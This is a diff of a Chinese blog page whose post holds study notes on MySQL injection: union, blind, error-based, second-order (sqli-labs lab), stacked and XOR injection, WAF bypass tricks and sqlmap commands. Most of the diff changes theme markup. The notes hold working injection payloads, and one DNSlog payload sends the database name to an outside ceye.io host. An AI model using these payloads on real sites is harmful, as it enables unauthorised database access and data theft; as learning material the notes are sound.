@@ -14,9 +14,8 @@
 <meta property="og:description" content="SQL注入学习">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-11-23T11:20:33.000Z">
-<meta property="article:modified_time" content="2023-01-15T07:50:55.304Z">
+<meta property="article:modified_time" content="2023-12-24T05:49:26.978Z">
 <meta property="article:author" content="killeveee">
-<meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary">
     
     
@@ -70,13 +69,11 @@
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      -->
       </ul>
     </span>
@@ -115,7 +112,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">数据库结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">MYSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text">查询方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">select查询语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#insert%E6%8F%92%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">insert插入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E5%88%A0%E9%99%A4%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete删除语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#update%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.4.</span> <span class="toc-text">update更新数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">有回显注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">无回显盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">floor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dnslog%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">dnslog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%87%BD%E6%95%B0%E5%8F%82%E8%80%83"><span class="toc-number">2.7.</span> <span class="toc-text">基本函数参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E4%BD%BF%E7%94%A8"><span class="toc-number">2.8.</span> <span class="toc-text">注释符使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">2.9.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-number">2.10.</span> <span class="toc-text">WAF绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">数据库结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">MYSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">查询方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.1.</span> <span class="toc-text">select查询语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.2.</span> <span class="toc-text">insert插入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete删除语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.4.</span> <span class="toc-text">update更新数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">有回显注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">无回显盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">floor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.5.</span> <span class="toc-text">dnslog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.7.</span> <span class="toc-text">基本函数参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.8.</span> <span class="toc-text">注释符使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.9.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.10.</span> <span class="toc-text">WAF绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a></li></ol>
       </div>
     
   </span>
@@ -148,23 +145,18 @@
       
     <div class="article-category">
         <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
     </div>
 
 
       
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
-    </div>
-
 
     </div>
   </header>
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h1><p>Access：</p>
+    <h1><span id="数据库结构">数据库结构</span></h1><p>Access：</p>
 <ul>
 <li>表名<ul>
 <li>列名<ul>
@@ -187,7 +179,7 @@
 </ul>
 </li>
 </ul>
-<h1 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h1><h2 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h2><h3 id="select查询语句"><a href="#select查询语句" class="headerlink" title="select查询语句"></a>select查询语句</h3><p>在网站应用中进行数据显示查询操作。</p>
+<h1><span id="mysql注入">MYSQL注入</span></h1><h2><span id="查询方式">查询方式</span></h2><h3><span id="select查询语句">select查询语句</span></h3><p>在网站应用中进行数据显示查询操作。</p>
 <p><strong>查库</strong>：</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT schema_name FROM information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -202,26 +194,26 @@
 
 
 
-<h3 id="insert插入语句"><a href="#insert插入语句" class="headerlink" title="insert插入语句"></a>insert插入语句</h3><p>在网站应用中进行用户注册添加等操作。</p>
+<h3><span id="insert插入语句">insert插入语句</span></h3><p>在网站应用中进行用户注册添加等操作。</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">INSERT INTO news(id,url,name) VALUES(2,&#39;x&#39;,&#39;abc&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h3 id="delete删除语句"><a href="#delete删除语句" class="headerlink" title="delete删除语句"></a>delete删除语句</h3><p>后台管理里面删除文章删除用户等操作。</p>
+<h3><span id="delete删除语句">delete删除语句</span></h3><p>后台管理里面删除文章删除用户等操作。</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">DELETE FROM news WHERE id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h3 id="update更新数据"><a href="#update更新数据" class="headerlink" title="update更新数据"></a>update更新数据</h3><p>会员或后台中心数据同步或缓存等操作。</p>
+<h3><span id="update更新数据">update更新数据</span></h3><p>会员或后台中心数据同步或缓存等操作。</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">UPDATE user SET pwd&#x3D;123 WHERE id&#x3D;2 and username&#x3D;&#39;admin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h2 id="有回显注入"><a href="#有回显注入" class="headerlink" title="有回显注入"></a>有回显注入</h2><p><strong>联合查询</strong></p>
+<h2><span id="有回显注入">有回显注入</span></h2><p><strong>联合查询</strong></p>
 <p>查列数：order by 4</p>
 <p>联合查询：union select 1,2,3,……</p>
 <p>在有回显的数字替换成查询语句即可。</p>
-<h2 id="无回显盲注"><a href="#无回显盲注" class="headerlink" title="无回显盲注"></a>无回显盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>regexp、like、ascii、left、ord、mid</p>
+<h2><span id="无回显盲注">无回显盲注</span></h2><h3><span id="布尔盲注">布尔盲注</span></h3><p>regexp、like、ascii、left、ord、mid</p>
 <p>一般配合py脚本注入。</p>
 <p>猜<strong>当前数据库名</strong>第一位字母：</p>
 <pre class="line-numbers language-none"><code class="language-none">&#39;and left(database(),1)&#x3D;&#39;s&#39;--+ 
@@ -240,7 +232,7 @@
 
 
 
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>if、sleep</p>
+<h3><span id="时间盲注">时间盲注</span></h3><p>if、sleep</p>
 <p>一般配合py脚本注入。</p>
 <table>
 <thead>
@@ -275,9 +267,9 @@
 </tr>
 </tbody></table>
 <p>判断是否存在漏洞：’and sleep(5)–+</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>页面无法显示数据库的信息，但是源码中有mysql输出错误的函数把mysql的错误回显到前端，也就是有报错内容的。<br>报错注入形式上一般是做两个嵌套的查询，里面的那个查询被称为子查询，执行顺序也是从子查询开始的，所以我们可以通过子查询查询我们想要的数据，然后在通过报错函数将我们查询到的数据带出，从而达到爆出想要查询的数据。</p>
+<h3><span id="报错注入">报错注入</span></h3><p>页面无法显示数据库的信息，但是源码中有mysql输出错误的函数把mysql的错误回显到前端，也就是有报错内容的。<br>报错注入形式上一般是做两个嵌套的查询，里面的那个查询被称为子查询，执行顺序也是从子查询开始的，所以我们可以通过子查询查询我们想要的数据，然后在通过报错函数将我们查询到的数据带出，从而达到爆出想要查询的数据。</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">12种报错注入+万能语句 - 简书 (jianshu.com)</a></p>
-<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>mysql版本号大于5.1.5</p>
+<h4><span id="extractvalue">extractvalue</span></h4><p>mysql版本号大于5.1.5</p>
 <p>对XML文档进行查询的函数。</p>
 <p><code>EXTRACTVALUE(XML_document,XPath_string)</code>：从<code>XML_document</code>中返回所包含查询值的<code>XPath_string</code>。</p>
 <p>第二个参数<code>XPath_String</code>是报错的关键，XML文档中查找字符位置是用<code>/xxx/xxx/xxx</code>这种格式，如果我们写入非法格式的内容就会报错，并且返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
@@ -300,7 +292,7 @@
 
 
 
-<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>mysql版本号大于5.1.5</p>
+<h4><span id="updatexml">updatexml</span></h4><p>mysql版本号大于5.1.5</p>
 <p>更新XML文档的函数。</p>
 <p><code>UPDATEXML(XML_document,XPath_string,new_value);</code></p>
 <p><code>updatexml()</code>的报错注入姿势和<code>extractvalue()</code>类似，也是第二个参数位置，输入非法字符，导致报错。</p>
@@ -319,7 +311,7 @@
 
 
 
-<h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究 - FreeBuf网络安全行业门户</a></p>
+<h4><span id="floor">floor</span></h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究 - FreeBuf网络安全行业门户</a></p>
 <blockquote>
 <p>这里需要先了解几个函数：<br>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a,且值最接近a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by x 分组语句，按照查询结果分组</p>
 </blockquote>
@@ -356,7 +348,7 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 
 
 
-<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>原理：攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。</p>
+<h2><span id="二次注入">二次注入</span></h2><p>原理：攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。</p>
 <p><code>sqli-labs_Less24</code>为例：</p>
 <p>先注册一个名为<code>admin&#39;#</code>的用户，然后登录改密码。</p>
 <p>更改密码用的语句：</p>
@@ -367,16 +359,16 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 
 <p><code>#</code>后面的都被注释了。变成了更改<code>admin</code>的密码。</p>
 <p>可以用更改后的密码登录admin，或者结合<code>报错/盲注</code>进行数据库注入。</p>
-<h2 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlog注入学习 - Lushun - 博客园 (cnblogs.com)</a></p>
+<h2><span id="dnslog注入">dnslog注入</span></h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlog注入学习 - Lushun - 博客园 (cnblogs.com)</a></p>
 <p>我的：<a target="_blank" rel="noopener" href="http://ceye.io/">CEYE - 监控服务以进行安全测试</a></p>
 <p>paylaod：</p>
 <pre class="line-numbers language-none"><code class="language-none">select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xhmmod.ceye.io&#x2F;abc&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询</p>
+<h2><span id="堆叠注入">堆叠注入</span></h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询</p>
 <p><code>;</code></p>
-<h2 id="基本函数参考"><a href="#基本函数参考" class="headerlink" title="基本函数参考"></a>基本函数参考</h2><table>
+<h2><span id="基本函数参考">基本函数参考</span></h2><table>
 <thead>
 <tr>
 <th>函数</th>
@@ -470,7 +462,7 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 <td>select ‘句子’ into outfile ‘文件路径及名称’</td>
 </tr>
 </tbody></table>
-<h2 id="注释符使用"><a href="#注释符使用" class="headerlink" title="注释符使用"></a>注释符使用</h2><p>（GET提交方式）：</p>
+<h2><span id="注释符使用">注释符使用</span></h2><p>（GET提交方式）：</p>
 <p>　　 – （后面有空格）</p>
 <p>　　 %23</p>
 <p>　　payload结尾单引号闭合</p>
@@ -478,7 +470,7 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 <p>　　 – （后面有空格）</p>
 <p>　　 #</p>
 <p>　　 payload结尾单引号闭合</p>
-<h2 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h2><p>当 <code>union</code>,<code>and</code> 被完全过滤掉了,就可以考虑使用异或注入 </p>
+<h2><span id="异或注入">异或注入</span></h2><p>当 <code>union</code>,<code>and</code> 被完全过滤掉了,就可以考虑使用异或注入 </p>
 <p>异或运算规则: </p>
 <p>&#x3D;&#x3D;1^1&#x3D;0	0^0&#x3D;0	0^1&#x3D;1&#x3D;&#x3D;</p>
 <p>1^ 1^1&#x3D;0	1^ 1^0&#x3D;0</p>
@@ -486,7 +478,7 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 <p><code>xor</code> 是逻辑上的异或操作；<code>^</code> 是前后进行二进制层面的异或运算</p>
 <p>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p>
 <hr>
-<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><ol>
+<h2><span id="waf绕过">WAF绕过</span></h2><ol>
 <li><p>大小写</p>
 </li>
 <li><p>关键字重复（双写）</p>
@@ -561,7 +553,7 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;admin.php?id&#x3D;1 and 1&#x3D;1	
 2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <hr>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>sqlmap、NoSQLAttack、Pangolin</p>
+<h1><span id="工具">工具</span></h1><p>sqlmap、NoSQLAttack、Pangolin</p>
 <p>Sqlmap使用：</p>
 <p>一般：</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -634,13 +626,11 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;admin.php?id&#x3D;1 and 1&#x3D;1	
         
           <li><a href="/">首页</a></li>
         
-          <li><a href="/about/">关于</a></li>
-        
           <li><a href="/archives/">归档</a></li>
         
           <li><a href="/categories/">分类</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/about/">关于</a></li>
         
       </ul>
     </div>
@@ -648,7 +638,7 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;admin.php?id&#x3D;1 and 1&#x3D;1	
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">数据库结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">MYSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text">查询方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">select查询语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#insert%E6%8F%92%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">insert插入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E5%88%A0%E9%99%A4%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete删除语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#update%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.4.</span> <span class="toc-text">update更新数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">有回显注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">无回显盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">floor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dnslog%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">dnslog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%87%BD%E6%95%B0%E5%8F%82%E8%80%83"><span class="toc-number">2.7.</span> <span class="toc-text">基本函数参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E4%BD%BF%E7%94%A8"><span class="toc-number">2.8.</span> <span class="toc-text">注释符使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">2.9.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-number">2.10.</span> <span class="toc-text">WAF绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">数据库结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">MYSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">查询方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.1.</span> <span class="toc-text">select查询语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.2.</span> <span class="toc-text">insert插入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete删除语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.4.</span> <span class="toc-text">update更新数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">有回显注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">无回显盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">floor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.5.</span> <span class="toc-text">dnslog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.7.</span> <span class="toc-text">基本函数参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.8.</span> <span class="toc-text">注释符使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.9.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.10.</span> <span class="toc-text">WAF绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a></li></ol>
       </div>
     
 
@@ -696,13 +686,11 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;admin.php?id&#x3D;1 and 1&#x3D;1	
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      -->
       </ul>
     </nav>
